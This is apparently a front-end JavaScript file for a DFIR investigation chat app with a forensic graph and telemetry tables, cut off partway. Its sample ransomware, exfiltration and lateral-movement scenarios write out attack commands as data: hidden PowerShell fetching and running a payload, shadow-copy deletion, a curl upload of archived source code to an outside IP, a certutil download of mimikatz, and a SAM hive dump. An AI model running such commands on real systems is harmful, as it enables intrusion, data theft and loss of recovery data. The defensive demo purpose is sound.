/**
 * A1 DFIR Investigator - ChatGPT Style Frontend Logic
 */

(function () {
  "use strict";

  // Application State
  const state = {
    activeProvider: "ollama",
    activeModel: "gemma4:31b",
    currentDb: "",
    databases: [],
    models: {
      ollama: [
        "gemma4:31b",
        "llama3.1",
        "llama3.3",
        "mistral-large-3:675b",
        "deepseek-v4-pro:0813",
        "deepseek-r1",
        "nemotron-3-nano:30b",
        "glm-5.3-flash",
      ],
      openai: [
        "gpt-4o",
        "gpt-4o-mini",
        "o1-mini",
        "o3-mini",
        "gpt-4-turbo",
      ],
    },
    isGenerating: false,
    activeAbortController: null,
    history: [],
    currentSessionId: null,
  };

  // DOM Elements
  const elements = {
    themeToggleBtn: document.getElementById("themeToggleBtn"),
    sidebar: document.getElementById("sidebar"),
    sidebarCollapseBtn: document.getElementById("sidebarCollapseBtn"),
    sidebarToggleBtn: document.getElementById("sidebarToggleBtn"),
    sidebarViewTableBtn: document.getElementById("sidebarViewTableBtn"),
    newChatBtn: document.getElementById("newChatBtn"),
    clearChatBtn: document.getElementById("clearChatBtn"),
    clearHistoryBtn: document.getElementById("clearHistoryBtn"),
    historyList: document.getElementById("historyList"),
    dbSelect: document.getElementById("dbSelect"),
    headerDbName: document.getElementById("headerDbName"),
    headerDbPill: document.getElementById("headerDbPill"),
    headerTableBtn: document.getElementById("headerTableBtn"),
    headerTableBadge: document.getElementById("headerTableBadge"),
    // Global Table Dialog
    globalTableDialog: document.getElementById("globalTableDialog"),
    globalDialogCloseBtn: document.getElementById("globalDialogCloseBtn"),
    globalDialogCopyBtn: document.getElementById("globalDialogCopyBtn"),
    globalDialogSearchInput: document.getElementById("globalDialogSearchInput"),
    globalDialogCountBadge: document.getElementById("globalDialogCountBadge"),
    globalDialogTableWrap: document.getElementById("globalDialogTableWrap"),
    globalDialogTitle: document.getElementById("globalDialogTitle"),
    globalDialogMeta: document.getElementById("globalDialogMeta"),
    // Model Selector Dropdown Elements
    modelDropdownContainer: document.getElementById("modelDropdownContainer"),
    modelSelectorPill: document.getElementById("modelSelectorPill"),
    modelMenu: document.getElementById("modelMenu"),
    activeModelName: document.getElementById("activeModelName"),
    activeProviderBadge: document.getElementById("activeProviderBadge"),
    tabOllama: document.getElementById("tabOllama"),
    tabOpenai: document.getElementById("tabOpenai"),
    modelSearchInput: document.getElementById("modelSearchInput"),
    modelList: document.getElementById("modelList"),
    customModelInput: document.getElementById("customModelInput"),
    applyCustomModelBtn: document.getElementById("applyCustomModelBtn"),
    // Chat Stage & Input
    chatStage: document.getElementById("chatStage"),
    welcomeScreen: document.getElementById("welcomeScreen"),
    messagesContainer: document.getElementById("messagesContainer"),
    promptInput: document.getElementById("promptInput"),
    sendBtn: document.getElementById("sendBtn"),
    inputMetaModel: document.getElementById("inputMetaModel"),
    inputMetaDb: document.getElementById("inputMetaDb"),
    systemStatusDot: document.getElementById("systemStatusDot"),
    systemStatusText: document.getElementById("systemStatusText"),
    // Workbench View Modes
    tabViewGraph: document.getElementById("tabViewGraph"),
    tabViewChat: document.getElementById("tabViewChat"),
    tabViewReport: document.getElementById("tabViewReport"),
    graphStage: document.getElementById("graphStage"),
    reportStage: document.getElementById("reportStage"),
    graphNodeCountBadge: document.getElementById("graphNodeCountBadge"),
    graphLiveStatus: document.getElementById("graphLiveStatus"),
    // Graph Controls
    graphCanvasContainer: document.getElementById("graphCanvasContainer"),
    graphSearchInput: document.getElementById("graphSearchInput"),
    graphExpandAllBtn: document.getElementById("graphExpandAllBtn"),
    graphCollapseAllBtn: document.getElementById("graphCollapseAllBtn"),
    graphZoomInBtn: document.getElementById("graphZoomInBtn"),
    graphZoomOutBtn: document.getElementById("graphZoomOutBtn"),
    graphFitBtn: document.getElementById("graphFitBtn"),
    scenarioDropdownBtn: document.getElementById("scenarioDropdownBtn"),
    scenarioMenu: document.getElementById("scenarioMenu"),
    // Inspector Drawer
    graphInspectorDrawer: document.getElementById("graphInspectorDrawer"),
    inspectorCloseBtn: document.getElementById("inspectorCloseBtn"),
    inspectorTypeBadge: document.getElementById("inspectorTypeBadge"),
    inspectorThreatBadge: document.getElementById("inspectorThreatBadge"),
    inspectorTitle: document.getElementById("inspectorTitle"),
    inspectorSubtitle: document.getElementById("inspectorSubtitle"),
    inspectorBody: document.getElementById("inspectorBody"),
    // Report Stage Elements
    reportStageVerdict: document.getElementById("reportStageVerdict"),
    reportStageVerdictTag: document.getElementById("reportStageVerdictTag"),
    reportStageVerdictTime: document.getElementById("reportStageVerdictTime"),
    reportStageContent: document.getElementById("reportStageContent"),
    reportStageCopyBtn: document.getElementById("reportStageCopyBtn"),
  };

  let activeEvidenceHandler = null;
  let latestEvidenceTimeline = null;
  let forensicGraph = null;
  let currentActiveView = "chat";

  // Pre-configured High-Fidelity Forensic Scenarios for Instant Graph Exploration
  const SAMPLE_SCENARIOS = {
    ransomware: [
      {
        timestamp: "2026-09-20T10:05:12Z",
        host_id: "WS-ACCT-01",
        action: "process_started",
        process_name: "winword.exe",
        process_entity_id: "3104",
        parent_process_name: "explorer.exe",
        parent_process_entity_id: "1050",
        command_line: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" "C:\\Users\\alice\\Downloads\\invoice_2026-Q3.docx"',
        summary: "User opened phishing macro invoice_2026-Q3.docx in Word"
      },
      {
        timestamp: "2026-09-20T10:10:05Z",
        host_id: "WS-ACCT-01",
        action: "process_started",
        process_name: "powershell.exe",
        process_entity_id: "4820",
        parent_process_name: "winword.exe",
        parent_process_entity_id: "3104",
        command_line: 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri http://198.51.100.77:8080/lockbit.exe -OutFile C:\\Users\\alice\\AppData\\Local\\Temp\\lockbit.exe; Start-Process C:\\Users\\alice\\AppData\\Local\\Temp\\lockbit.exe"',
        summary: "Word spawned hidden PowerShell downloading second-stage payload"
      },
      {
        timestamp: "2026-09-20T10:10:08Z",
        host_id: "WS-ACCT-01",
        action: "network_connection",
        process_name: "powershell.exe",
        process_entity_id: "4820",
        destination_ip: "198.51.100.77",
        destination_port: "8080",
        network_direction: "Outbound",
        summary: "Outbound C2 payload fetch to 198.51.100.77:8080"
      },
      {
        timestamp: "2026-09-20T10:15:30Z",
        host_id: "WS-ACCT-01",
        action: "process_started",
        process_name: "vssadmin.exe",
        process_entity_id: "5112",
        parent_process_name: "powershell.exe",
        parent_process_entity_id: "4820",
        command_line: "vssadmin.exe delete shadows /all /quiet",
        summary: "Shadow copy deletion to inhibit system recovery"
      },
      {
        timestamp: "2026-09-20T10:16:00Z",
        host_id: "WS-ACCT-01",
        action: "process_started",
        process_name: "lockbit.exe",
        process_entity_id: "4700",
        parent_process_name: "powershell.exe",
        parent_process_entity_id: "4820",
        command_line: "C:\\Users\\alice\\AppData\\Local\\Temp\\lockbit.exe",
        summary: "LockBit ransomware encryptor execution"
      },
      {
        timestamp: "2026-09-20T10:17:15Z",
        host_id: "WS-ACCT-01",
        action: "file_created",
        process_name: "lockbit.exe",
        process_entity_id: "4700",
        file_name: "Q3_Financial_Statement.xlsx.locked",
        file_path: "C:\\Users\\alice\\Documents\\Q3_Financial_Statement.xlsx.locked",
        summary: "Encrypted document created with .locked extension"
      },
      {
        timestamp: "2026-09-20T10:17:18Z",
        host_id: "WS-ACCT-01",
        action: "file_created",
        process_name: "lockbit.exe",
        process_entity_id: "4700",
        file_name: "Payroll_2026.docx.locked",
        file_path: "C:\\Users\\alice\\Documents\\Payroll_2026.docx.locked",
        summary: "Encrypted document created with .locked extension"
      },
      {
        timestamp: "2026-09-20T10:18:00Z",
        host_id: "WS-ACCT-01",
        action: "registry_created",
        process_name: "lockbit.exe",
        process_entity_id: "4700",
        registry_key: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\LockBitRansom",
        summary: "Ransom note persistence registry key created"
      }
    ],
    exfil: [
      {
        timestamp: "2026-09-11T14:02:10Z",
        host_id: "WS-DEV-02",
        action: "process_started",
        process_name: "explorer.exe",
        process_entity_id: "1200",
        summary: "User desktop shell active"
      },
      {
        timestamp: "2026-09-11T14:15:22Z",
        host_id: "WS-DEV-02",
        action: "process_started",
        process_name: "powershell.exe",
        process_entity_id: "2450",
        parent_process_name: "explorer.exe",
        parent_process_entity_id: "1200",
        command_line: "powershell.exe -ExecutionPolicy Bypass",
        summary: "Interactive PowerShell console launched"
      },
      {
        timestamp: "2026-09-11T14:18:05Z",
        host_id: "WS-DEV-02",
        action: "process_started",
        process_name: "7z.exe",
        process_entity_id: "2980",
        parent_process_name: "powershell.exe",
        parent_process_entity_id: "2450",
        command_line: '7z.exe a -pSecureP@ss2026 C:\\Windows\\Temp\\dev_archive.7z C:\\Users\\dev\\source\\*',
        summary: "Archive staging of source code to temporary directory"
      },
      {
        timestamp: "2026-09-11T14:18:30Z",
        host_id: "WS-DEV-02",
        action: "file_created",
        process_name: "7z.exe",
        process_entity_id: "2980",
        file_name: "dev_archive.7z",
        file_path: "C:\\Windows\\Temp\\dev_archive.7z",
        summary: "Encrypted 7-Zip staging archive created"
      },
      {
        timestamp: "2026-09-11T14:22:15Z",
        host_id: "WS-DEV-02",
        action: "process_started",
        process_name: "curl.exe",
        process_entity_id: "3110",
        parent_process_name: "powershell.exe",
        parent_process_entity_id: "2450",
        command_line: "curl.exe -F file=@C:\\Windows\\Temp\\dev_archive.7z https://203.0.113.88/upload",
        summary: "Outbound exfiltration POST request via curl"
      },
      {
        timestamp: "2026-09-11T14:22:16Z",
        host_id: "WS-DEV-02",
        action: "network_connection",
        process_name: "curl.exe",
        process_entity_id: "3110",
        destination_ip: "203.0.113.88",
        destination_port: "443",
        network_direction: "Outbound",
        summary: "Exfiltration network connection to external endpoint"
      },
      {
        timestamp: "2026-09-11T14:25:00Z",
        host_id: "WS-DEV-02",
        action: "file_deleted",
        process_name: "powershell.exe",
        process_entity_id: "2450",
        file_name: "dev_archive.7z",
        file_path: "C:\\Windows\\Temp\\dev_archive.7z",
        summary: "Staging archive deleted to destroy evidence"
      }
    ],
    lateral: [
      {
        timestamp: "2026-09-10T09:30:00Z",
        host_id: "WS-OPS-01",
        action: "process_started",
        process_name: "wsmprovhost.exe",
        process_entity_id: "1840",
        summary: "WinRM host provider worker initialized on WS-OPS-01"
      },
      {
        timestamp: "2026-09-10T09:31:12Z",
        host_id: "WS-OPS-01",
        action: "process_started",
        process_name: "powershell.exe",
        process_entity_id: "2100",
        parent_process_name: "wsmprovhost.exe",
        parent_process_entity_id: "1840",
        command_line: "powershell.exe -Enc cwBjAC4AZQB4AGUA...",
        summary: "Remote PowerShell spawned under WinRM"
      },
      {
        timestamp: "2026-09-10T09:33:45Z",
        host_id: "WS-OPS-01",
        action: "process_started",
        process_name: "certutil.exe",
        process_entity_id: "2600",
        parent_process_name: "powershell.exe",
        parent_process_entity_id: "2100",
        command_line: "certutil.exe -urlcache -split -f http://198.51.100.77/tools/mimikatz.exe C:\\Windows\\Temp\\m.exe",
        summary: "LOLBin certutil downloaded tool binary"
      },
      {
        timestamp: "2026-09-10T09:34:00Z",
        host_id: "WS-OPS-01",
        action: "network_connection",
        process_name: "certutil.exe",
        process_entity_id: "2600",
        destination_ip: "198.51.100.77",
        destination_port: "80",
        network_direction: "Outbound",
        summary: "HTTP download connection to 198.51.100.77"
      },
      {
        timestamp: "2026-09-10T09:40:10Z",
        host_id: "DC-AUTH-01",
        action: "process_started",
        process_name: "wmiprvse.exe",
        process_entity_id: "880",
        summary: "WMI service provider process triggered on Domain Controller"
      },
      {
        timestamp: "2026-09-10T09:41:00Z",
        host_id: "DC-AUTH-01",
        action: "process_started",
        process_name: "cmd.exe",
        process_entity_id: "920",
        parent_process_name: "wmiprvse.exe",
        parent_process_entity_id: "880",
        command_line: "cmd.exe /c reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save",
        summary: "Remote command execution dumping SAM registry hive on DC"
      },
      {
        timestamp: "2026-09-10T09:41:15Z",
        host_id: "DC-AUTH-01",
        action: "file_created",
        process_name: "cmd.exe",
        process_entity_id: "920",
        file_name: "sam.save",
        file_path: "C:\\Windows\\Temp\\sam.save",
        summary: "SAM hive backup file created"
      }
    ]
  };

  function switchView(viewName) {
    currentActiveView = viewName;
    const views = [
      { name: "graph", tab: elements.tabViewGraph, stage: elements.graphStage },
      { name: "chat", tab: elements.tabViewChat, stage: elements.chatStage },
      { name: "report", tab: elements.tabViewReport, stage: elements.reportStage },
    ];

    views.forEach((v) => {
      const isActive = v.name === viewName;
      if (v.tab) {
        v.tab.classList.toggle("active", isActive);
        v.tab.setAttribute("aria-selected", isActive ? "true" : "false");
      }
      if (v.stage) {
        v.stage.style.display = isActive ? "flex" : "none";
      }
    });

    if (viewName === "graph" && forensicGraph) {
      setTimeout(() => forensicGraph.fitToScreen(), 50);
    }
  }

  function initForensicGraph() {
    if (!elements.graphCanvasContainer || !window.ForensicGraph) return;
    forensicGraph = new window.ForensicGraph(elements.graphCanvasContainer, {
      onNodeSelect: (node) => openEntityInspector(node),
      onNodeDeselect: () => closeEntityInspector(),
      onExpansionChange: () => {
        if (forensicGraph) {
          const vis = forensicGraph.getVisibleCount();
          const total = forensicGraph.nodes.size;
          if (elements.graphNodeCountBadge) elements.graphNodeCountBadge.textContent = `${vis}`;
          if (elements.graphLiveStatus) elements.graphLiveStatus.textContent = `${vis} of ${total} nodes visible`;
          // Refresh inspector if open
          if (forensicGraph.selectedNodeId) {
            const selNode = forensicGraph.nodes.get(forensicGraph.selectedNodeId);
            if (selNode) openEntityInspector(selNode);
          }
        }
      },
    });
  }

  function loadTimelineIntoGraph(timelineEvents) {
    if (!forensicGraph) initForensicGraph();
    if (!forensicGraph) return;
    forensicGraph.loadTimeline(timelineEvents);
    const vis = forensicGraph.getVisibleCount ? forensicGraph.getVisibleCount() : forensicGraph.nodes.size;
    const total = forensicGraph.nodes.size;
    if (elements.graphNodeCountBadge) {
      elements.graphNodeCountBadge.textContent = `${vis}`;
    }
    if (elements.graphLiveStatus) {
      elements.graphLiveStatus.textContent = `${vis} of ${total} nodes visible`;
    }
  }

  function openEntityInspector(node) {
    if (!elements.graphInspectorDrawer) return;

    elements.inspectorTypeBadge.textContent = node.type.toUpperCase();
    elements.inspectorTypeBadge.className = `inspector-type-badge ${node.type}`;
    elements.inspectorTitle.textContent = node.name || "Entity";
    elements.inspectorSubtitle.textContent = node.pid ? `PID ${node.pid} · Host ${node.host}` : `Host ${node.host}`;

    if (node.isSuspicious) {
      elements.inspectorThreatBadge.style.display = "inline-flex";
    } else {
      elements.inspectorThreatBadge.style.display = "none";
    }

    elements.inspectorBody.innerHTML = "";

    // Action button to Expand / Collapse Connected Nodes if node has children
    if (node.children && node.children.length > 0 && forensicGraph) {
      const isExpanded = forensicGraph.expandedNodeIds.has(node.id);
      const expandBtn = document.createElement("button");
      expandBtn.type = "button";
      expandBtn.className = "inspector-expand-btn";
      expandBtn.innerHTML = `
        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
          ${isExpanded 
            ? '<line x1="5" y1="12" x2="19" y2="12"></line>' 
            : '<line x1="12" y1="5" x2="12" y2="19"></line><line x1="5" y1="12" x2="19" y2="12"></line>'}
        </svg>
        <span>${isExpanded ? `Collapse Connected Nodes (${node.children.length})` : `Expand Connected Nodes (${node.children.length})`}</span>
      `;
      expandBtn.onclick = () => {
        forensicGraph.toggleNodeExpansion(node.id);
      };
      elements.inspectorBody.appendChild(expandBtn);
    }

    // Command Line block if process
    if (node.cmdLine) {
      const cmdSec = document.createElement("div");
      cmdSec.className = "inspector-section";
      cmdSec.innerHTML = `
        <div class="inspector-section-label">Command Line / Execution</div>
        <div class="inspector-cmd-wrap">
          <div class="inspector-cmd">${escapeHtml(node.cmdLine)}</div>
          <button type="button" class="action-pill-btn-sm inspector-cmd-copy">
            <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            <span>Copy Command</span>
          </button>
        </div>
      `;
      cmdSec.querySelector(".inspector-cmd-copy").onclick = () => {
        navigator.clipboard.writeText(node.cmdLine);
        const span = cmdSec.querySelector(".inspector-cmd-copy span");
        span.textContent = "Copied!";
        setTimeout(() => (span.textContent = "Copy Command"), 1800);
      };
      elements.inspectorBody.appendChild(cmdSec);
    }

    // Connected Graph Lineage Section (Parents & Children chips)
    if (forensicGraph && ((node.children && node.children.length > 0) || (node.parents && node.parents.length > 0))) {
      const connSec = document.createElement("div");
      connSec.className = "inspector-section";
      connSec.innerHTML = `<div class="inspector-section-label">Connected Graph Lineage</div><div class="inspector-chips-list"></div>`;
      const chipsList = connSec.querySelector(".inspector-chips-list");

      // Parents
      if (node.parents && node.parents.length > 0) {
        node.parents.forEach((parentId) => {
          const parentNode = forensicGraph.nodes.get(parentId);
          if (!parentNode) return;
          const chip = document.createElement("button");
          chip.type = "button";
          chip.className = "inspector-entity-chip";
          chip.innerHTML = `
            <span class="inspector-chip-name">↑ ${escapeHtml(parentNode.name)}</span>
            <span class="inspector-chip-meta">Parent ${parentNode.type}</span>
          `;
          chip.onclick = () => {
            forensicGraph.selectNode(parentNode.id);
          };
          chipsList.appendChild(chip);
        });
      }

      // Children
      if (node.children && node.children.length > 0) {
        node.children.forEach((childId) => {
          const childNode = forensicGraph.nodes.get(childId);
          if (!childNode) return;
          const chip = document.createElement("button");
          chip.type = "button";
          chip.className = "inspector-entity-chip";
          chip.innerHTML = `
            <span class="inspector-chip-name">↳ ${escapeHtml(childNode.name)}</span>
            <span class="inspector-chip-meta">${childNode.type}</span>
          `;
          chip.onclick = () => {
            if (!forensicGraph.expandedNodeIds.has(node.id)) {
              forensicGraph.toggleNodeExpansion(node.id, true);
            }
            forensicGraph.selectNode(childNode.id);
          };
          chipsList.appendChild(chip);
        });
      }

      elements.inspectorBody.appendChild(connSec);
    }

    // Key-value Attributes
    const kvSec = document.createElement("div");
    kvSec.className = "inspector-section";
    const kvGrid = document.createElement("div");
    kvGrid.className = "inspector-kv-grid";

    const rows = [
      ["Type", node.type],
      ["Host", node.host],
      ["Timestamp", node.timestamp || "N/A"],
      ["Action", node.action || "N/A"],
    ];

    if (node.type === "process") {
      rows.push(["PID", node.pid]);
      if (node.parentName) rows.push(["Parent Proc", `${node.parentName} (${node.parentId || '?'})`]);
      if (node.childrenCount !== undefined) rows.push(["Children Spawned", `${node.childrenCount}`]);
    } else if (node.type === "network") {
      rows.push(["IP Address", node.ip]);
      rows.push(["Port", node.port || "N/A"]);
      rows.push(["Direction", node.direction]);
    } else if (node.type === "file") {
      rows.push(["File Action", node.fileAction]);
      rows.push(["File Path", node.fullPath]);
    } else if (node.type === "registry") {
      rows.push(["Key Path", node.fullPath]);
    }

    rows.forEach(([k, v]) => {
      const kEl = document.createElement("div");
      kEl.className = "inspector-k";
      kEl.textContent = k;
      const vEl = document.createElement("div");
      vEl.className = "inspector-v";
      vEl.textContent = v;
      kvGrid.appendChild(kEl);
      kvGrid.appendChild(vEl);
    });

    kvSec.appendChild(kvGrid);
    elements.inspectorBody.appendChild(kvSec);

    elements.graphInspectorDrawer.classList.add("open");
  }

  function closeEntityInspector() {
    if (elements.graphInspectorDrawer) {
      elements.graphInspectorDrawer.classList.remove("open");
    }
  }

  // -------------------------------------------------------------------------
  // Initialization
  // -------------------------------------------------------------------------
  async function init() {
    loadTheme();
    loadSavedHistory();
    loadSidebarState();
    initForensicGraph();
    setupEventListeners();
    await fetchInitialStatus();
    await fetchModels();
    preloadEventCount();
  }

  // -------------------------------------------------------------------------
  // Theme Handling
  // -------------------------------------------------------------------------
  function loadTheme() {
    const savedTheme = localStorage.getItem("a1_theme") || "dark";
    if (savedTheme === "dark") {
      document.body.classList.add("theme-dark");
    } else {
      document.body.classList.remove("theme-dark");
    }
  }

  function toggleTheme() {
    const isDark = document.body.classList.toggle("theme-dark");
    localStorage.setItem("a1_theme", isDark ? "dark" : "light");
  }

  // -------------------------------------------------------------------------
  // Sidebar State & Keyboard Shortcuts
  // -------------------------------------------------------------------------
  function loadSidebarState() {
    const saved = localStorage.getItem("a1_sidebar_collapsed") === "true";
    if (saved && elements.sidebar) {
      elements.sidebar.classList.add("collapsed");
      if (elements.sidebarToggleBtn) {
        elements.sidebarToggleBtn.title = "Open Sidebar (Ctrl+B)";
        elements.sidebarToggleBtn.setAttribute("aria-label", "Open Sidebar");
      }
    }
  }

  function toggleSidebar(forceState) {
    if (!elements.sidebar) return;
    const isCollapsed = forceState !== undefined ? !forceState : !elements.sidebar.classList.contains("collapsed");
    if (isCollapsed) {
      elements.sidebar.classList.add("collapsed");
      if (elements.sidebarToggleBtn) {
        elements.sidebarToggleBtn.title = "Open Sidebar (Ctrl+B)";
        elements.sidebarToggleBtn.setAttribute("aria-label", "Open Sidebar");
      }
    } else {
      elements.sidebar.classList.remove("collapsed");
      if (elements.sidebarToggleBtn) {
        elements.sidebarToggleBtn.title = "Collapse Sidebar (Ctrl+B)";
        elements.sidebarToggleBtn.setAttribute("aria-label", "Collapse Sidebar");
      }
    }
    try {
      localStorage.setItem("a1_sidebar_collapsed", isCollapsed ? "true" : "false");
    } catch (e) { }
  }

  // -------------------------------------------------------------------------
  // Shared Telemetry Table Renderer & Global Dialog
  // -------------------------------------------------------------------------
  let globalTelemetryCache = null;

  function formatActionBadge(action) {
    const a = (action || "unknown").toLowerCase();
    let badgeClass = "action-badge-default";
    if (a.includes("proc")) badgeClass = "action-badge-process";
    else if (a.includes("net")) badgeClass = "action-badge-network";
    else if (a.includes("file")) badgeClass = "action-badge-file";
    else if (a.includes("reg")) badgeClass = "action-badge-registry";
    return `<span class="action-badge ${badgeClass}">${escapeHtml(action || "unknown")}</span>`;
  }

  function setupTable(container, events, searchInput, countBadge, copyBtn) {
    if (!container) return;
    container.replaceChildren();

    if (!events || events.length === 0) {
      const empty = document.createElement("div");
      empty.className = "history-empty";
      empty.textContent = "No telemetry events to display";
      container.appendChild(empty);
      if (countBadge) countBadge.textContent = "0 events";
      return;
    }

    const table = document.createElement("table");
    table.className = "evidence-table";
    table.setAttribute("aria-label", "Telemetry events table");
    const caption = table.createCaption();
    caption.className = "sr-only";
    caption.textContent = "Telemetry events table";
    const columns = ["Time", "Event ID", "Host", "Action", "Process", "Summary"];
    const headerRow = table.createTHead().insertRow();
    columns.forEach((column) => {
      const header = document.createElement("th");
      header.scope = "col";
      header.textContent = column;
      headerRow.appendChild(header);
    });

    const tableBody = table.createTBody();
    const rowEntries = [];

    events.forEach((event) => {
      const details = event.details && typeof event.details === "object" ? event.details : {};
      const processName = event.process_name || details.name || details.process_name || "";
      const processId = event.process_entity_id || details.pid || "";
      const process = processName && processId
        ? `${processName} (${processId})`
        : processName || processId || "Unknown";

      const row = tableBody.insertRow();
      const timeCell = row.insertCell();
      timeCell.textContent = event.timestamp || "Time unavailable";

      const eventIdCell = row.insertCell();
      eventIdCell.textContent = event.event_id || "Unknown event";

      const hostCell = row.insertCell();
      hostCell.textContent = event.host_id || "Unknown host";

      const actionCell = row.insertCell();
      actionCell.innerHTML = formatActionBadge(event.action);

      const processCell = row.insertCell();
      processCell.textContent = process;

      const summaryCell = row.insertCell();
      summaryCell.textContent = event.summary || details.command_line || details.destination_ip || "No summary available";

      rowEntries.push({
        row,
        searchStr: `${event.timestamp || ""} ${event.event_id || ""} ${event.host_id || ""} ${event.action || ""} ${process} ${summaryCell.textContent}`.toLowerCase()
      });
    });

    container.appendChild(table);

    function updateFilter() {
      const query = (searchInput ? searchInput.value : "").trim().toLowerCase();
      let visibleCount = 0;
      rowEntries.forEach((entry) => {
        const match = !query || entry.searchStr.includes(query);
        entry.row.style.display = match ? "" : "none";
        if (match) visibleCount++;
      });
      if (countBadge) {
        countBadge.textContent = `${visibleCount} of ${events.length} event(s)`;
      }
    }

    if (searchInput) {
      searchInput.oninput = updateFilter;
      updateFilter();
    }

    if (copyBtn) {
      copyBtn.onclick = () => {
        const headers = ["Time", "Event ID", "Host", "Action", "Process", "Summary"];
        const csvLines = [headers.join(",")];
        events.forEach((e) => {
          const details = e.details && typeof e.details === "object" ? e.details : {};
          const pName = e.process_name || details.name || details.process_name || "";
          const pId = e.process_entity_id || details.pid || "";
          const proc = pName && pId ? `${pName} (${pId})` : pName || pId || "Unknown";
          const row = [
            JSON.stringify(e.timestamp || ""),
            JSON.stringify(e.event_id || ""),
            JSON.stringify(e.host_id || ""),
            JSON.stringify(e.action || ""),
            JSON.stringify(proc),
            JSON.stringify(e.summary || details.command_line || "")
          ];
          csvLines.push(row.join(","));
        });
        navigator.clipboard.writeText(csvLines.join("\n"));
        const span = copyBtn.querySelector("span");
        if (span) {
          const orig = span.textContent;
          span.textContent = "Copied CSV!";
          setTimeout(() => { span.textContent = orig; }, 2000);
        }
      };
    }
  }

  async function openGlobalTelemetryTable(eventsToDisplay, customTitle) {
    if (!elements.globalTableDialog) return;

    if (eventsToDisplay && Array.isArray(eventsToDisplay) && eventsToDisplay.length > 0) {
      if (elements.globalDialogTitle) elements.globalDialogTitle.textContent = customTitle || "Investigation Telemetry Events";
      if (elements.globalDialogMeta) elements.globalDialogMeta.textContent = `${eventsToDisplay.length} events retained from investigation`;
      setupTable(
        elements.globalDialogTableWrap,
        eventsToDisplay,
        elements.globalDialogSearchInput,
        elements.globalDialogCountBadge,
        elements.globalDialogCopyBtn
      );
      elements.globalTableDialog.showModal();
      return;
    }

    // Otherwise, fetch latest events from active database
    if (elements.globalDialogTitle) elements.globalDialogTitle.textContent = `Database Telemetry: ${state.currentDb || "Active DB"}`;
    if (elements.globalDialogMeta) elements.globalDialogMeta.textContent = "Loading events from database...";
    elements.globalTableDialog.showModal();

    try {
      const res = await fetch("/api/events?limit=2500");
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const data = await res.json();
      const events = data.events || [];
      globalTelemetryCache = events;
      if (elements.globalDialogMeta) {
        if (data.total && data.total > events.length) {
          elements.globalDialogMeta.textContent = `${events.length} of ${data.total} events loaded from ${data.db_name || state.currentDb}`;
        } else {
          elements.globalDialogMeta.textContent = `${events.length} events loaded from ${data.db_name || state.currentDb}`;
        }
      }
      if (elements.headerTableBadge) {
        elements.headerTableBadge.textContent = `${data.total || events.length}`;
      }
      setupTable(
        elements.globalDialogTableWrap,
        events,
        elements.globalDialogSearchInput,
        elements.globalDialogCountBadge,
        elements.globalDialogCopyBtn
      );
    } catch (err) {
      if (elements.globalDialogMeta) elements.globalDialogMeta.textContent = `Failed to load events: ${err.message}`;
    }
  }

  async function preloadEventCount() {
    try {
      const res = await fetch("/api/events?limit=1");
      if (res.ok) {
        const data = await res.json();
        if (elements.headerTableBadge && data.total != null) {
          elements.headerTableBadge.textContent = `${data.total}`;
        }
      }
    } catch (e) {
      // silent fallback
    }
  }

  // -------------------------------------------------------------------------
  // API Calls & State Sync
  // -------------------------------------------------------------------------
  async function fetchInitialStatus() {
    try {
      const res = await fetch("/api/status");
      if (!res.ok) throw new Error("Failed to load status");
      const data = await res.json();

      if (data.active_llm) {
        state.activeProvider = data.active_llm.provider;
        state.activeModel = data.active_llm.model;
        updateModelUI();
      }

      if (data.databases) {
        state.databases = data.databases;
        renderDatabases();
      }

      elements.systemStatusText.textContent = "Ready";
      elements.systemStatusDot.style.backgroundColor = "var(--accent-primary)";
    } catch (err) {
      console.error("fetchInitialStatus error:", err);
      elements.systemStatusText.textContent = "Offline";
      elements.systemStatusDot.style.backgroundColor = "#ef4444";
    }
  }

  async function fetchModels() {
    try {
      const res = await fetch("/api/models");
      if (!res.ok) return;
      const data = await res.json();
      if (Array.isArray(data.ollama) && data.ollama.length > 0) {
        state.models.ollama = data.ollama;
      }
      if (Array.isArray(data.openai) && data.openai.length > 0) {
        state.models.openai = data.openai;
      }
      if (data.active) {
        if (data.active.provider) state.activeProvider = data.active.provider;
        if (data.active.model) state.activeModel = data.active.model;
        updateModelUI();
      }
      renderModelList();
    } catch (err) {
      console.warn("fetchModels error:", err);
    }
  }

  function renderDatabases() {
    elements.dbSelect.innerHTML = "";
    state.databases.forEach((db) => {
      const opt = document.createElement("option");
      opt.value = db.path;
      opt.textContent = `${db.display || db.name} (${formatBytes(db.size_bytes)})`;
      if (db.is_active) {
        opt.selected = true;
        state.currentDb = db.name;
        elements.headerDbName.textContent = db.name;
        elements.inputMetaDb.textContent = db.name;
      }
      elements.dbSelect.appendChild(opt);
    });
    updateActiveDbPromptHighlight();
  }

  function updateActiveDbPromptHighlight() {
    const activeName = state.currentDb || (elements.headerDbName ? elements.headerDbName.textContent.trim() : "");
    if (!activeName) return;
    document.querySelectorAll(".suggestion-item").forEach((item) => {
      const itemDb = item.getAttribute("data-db") || "";
      if (itemDb === activeName || activeName.includes(itemDb) || itemDb.includes(activeName)) {
        item.classList.add("highlight-active-db");
      } else {
        item.classList.remove("highlight-active-db");
      }
    });

    const activeFilterBtn = document.getElementById("filterActiveDbBtn");
    if (activeFilterBtn) {
      activeFilterBtn.textContent = `Active DB (${activeName.replace(".db", "")})`;
    }
  }

  async function onDatabaseChange(e) {
    const path = e.target.value;
    try {
      const res = await fetch("/api/databases/set", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ db_path: path }),
      });
      if (!res.ok) throw new Error("Failed to switch database");
      const data = await res.json();
      const dbObj = state.databases.find((d) => d.path === path);
      if (dbObj) {
        state.currentDb = dbObj.name;
        elements.headerDbName.textContent = dbObj.name;
        elements.inputMetaDb.textContent = dbObj.name;
        updateActiveDbPromptHighlight();
      }
    } catch (err) {
      alert("Error switching database: " + err.message);
    }
  }

  // -------------------------------------------------------------------------
